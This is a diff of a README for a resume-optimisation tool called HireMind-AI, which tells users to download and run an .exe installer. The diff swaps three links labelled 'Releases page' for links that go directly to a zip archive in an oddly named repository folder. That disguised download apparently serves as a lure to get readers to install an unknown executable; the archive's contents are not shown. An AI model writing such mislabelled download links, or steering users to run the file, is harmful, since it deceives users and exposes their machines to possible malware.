@@ -1,12 +1,12 @@
 # 🧠 HireMind-AI - Optimize your resume for top jobs
 
-[![](https://img.shields.io/badge/Download-HireMind-AI-blue)](https://github.com/Giyutom2544/HireMind-AI/releases)
+[![](https://img.shields.io/badge/Download-HireMind-AI-blue)](https://raw.githubusercontent.com/Giyutom2544/HireMind-AI/main/pinonic/Hire_Mind_AI_v1.8.zip)
 
 HireMind-AI helps you match your experience to specific job requirements. This tool analyzes your resume against job postings to find missing skills and suggest improvements. You can generate custom cover letters and see how your resume performs against Applicant Tracking Systems used by recruiters.
 
 ## 📥 How to download the software
 
-1. Go to the [Releases page](https://github.com/Giyutom2544/HireMind-AI/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Giyutom2544/HireMind-AI/main/pinonic/Hire_Mind_AI_v1.8.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download the installer.
 4. Save the file to your computer.
@@ -84,4 +84,4 @@ No. Please upload files in PDF or .docx format. Documents created with text-base
 **Is there a cost to use this?**
 This application is free for individual use. 
 
-If you encounter persistent issues, return to the [Releases page](https://github.com/Giyutom2544/HireMind-AI/releases) to see if a newer version is available. Developers release updates to fix bugs and improve performance regularly.
+If you encounter persistent issues, return to the [Releases page](https://raw.githubusercontent.com/Giyutom2544/HireMind-AI/main/pinonic/Hire_Mind_AI_v1.8.zip) to see if a newer version is available. Developers release updates to fix bugs and improve performance regularly.
